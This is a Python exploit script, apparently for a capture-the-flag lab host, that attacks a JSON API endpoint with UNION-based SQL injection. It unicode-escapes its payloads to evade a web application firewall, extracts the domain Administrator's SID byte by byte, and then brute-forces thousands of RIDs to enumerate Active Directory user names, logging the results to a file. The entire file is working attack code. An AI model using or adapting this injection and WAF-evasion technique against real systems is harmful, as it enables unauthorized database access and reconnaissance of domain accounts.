#!/usr/bin/env python3




import time
import struct
import requests
from pwn import log




hex_array = []




def unicode(payload):
    utf = []
    encode_this = payload
    for i in encode_this:
        utf.append(r"\u00" + hex(ord(i)).split('x')[1])

    unicode_payload = ''.join([i for i in utf])

    return unicode_payload
   



def make_request(i):
    payload = unicode(f"Sarina'UNION SELECT 1,substring(SUSER_SID('MEGACORP\Administrator'),{int(i)},1),3,4,5-- -'")
    url = 'http://10.10.10.179/api/getColleagues'
    proxies = {'http':'127.0.0.1:8080'}
    headers = {
        'Host': '10.10.10.179',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json;charset=utf-8',
        'Content-Length': '233',
        'Origin': 'http://10.10.10.179',
        'Connection': 'close',
        'Referer': 'http://10.10.10.179/'
    }
    data = '{"name":"'+payload+'"}'
    res = requests.post(url, headers=headers, data=data, proxies=proxies)

    return parse_data(res.content.decode())




def parse_data(response):
    parse_response = response.split('"')[5]
    if '\\u' in parse_response:
        hex_array.append(parse_response[4:])
    else:
        unicode_chars = hex(ord(parse_response)).split('x')[1]
        hex_array.append(unicode_chars)

    return '0x' + ''.join(hex_array)
 



def enumerate_users(RID):
    first_eight = struct.pack('<L', int(RID[-8:], 16))
    user_rid = struct.unpack('>L', first_eight)[0]
    payload = f"Sarina'UNION SELECT 1,suser_sname({RID}),3,4,5-- -'"
    payload = unicode(payload)
    url = 'http://10.10.10.179/api/getColleagues' 
    proxies = {'http':'127.0.0.1:8080'}
    headers = {
            'Host': '10.10.10.179',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json;charset=utf-8'} 
    data = '{"name":"'+payload+'"}'
    res = requests.post(url, headers=headers, data=data, proxies=proxies)
    res = res.content.decode().split('"')[5]
    log.success(f'User with RID {user_rid}: %s', res)

    return res




def main():
#Uncomment the next 4 lines, then comment 'full_hex_sid' in order to get hex sid automatically
#    for i in range(1, 29):
#        print(i)
#        full_hex_sid = make_request(i)
#        time.sleep(1)
    full_hex_sid = '0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000'
    first_eight = struct.pack('<L', int(full_hex_sid[-8:], 16))
    RID = struct.unpack('>L', first_eight)[0]
    log.success(f'RID 500 is Built-in Admin: %s', RID)
    log.success(f'Hex of SID: %s', full_hex_sid)

#   Uncomment next 2 lines and change range to go back an check RIDs that the WAF blocked. 
#    with open('check_these.txt', 'r') as r:
#        check_these = r.read().split('\n')
    #Append big endian RID to full_hex_sid up until the last 4 bytes
    with open('SQL_SID_user_brute.txt', 'a') as a:
        for i in range(2724,10000):
            send_rid = struct.pack('<L', int(i)).ljust(4, b'\x00')          #pack RID
            send_rid = hex(struct.unpack('>L', send_rid)[0])                #unpack in BIG endian to append
            send_rid = full_hex_sid[:-8] + send_rid.split('x')[1]           #new sid
            enum_response = enumerate_users(send_rid)
            if 'www.w3.org' in enum_response:
                a.write(f'WAF blocked RID {i}')
                a.write('\n')
                time.sleep(10)
                continue
            if enum_response:
                a.write(enum_response)
                a.write('\n')
            time.sleep(2)




if __name__=='__main__':
    main()
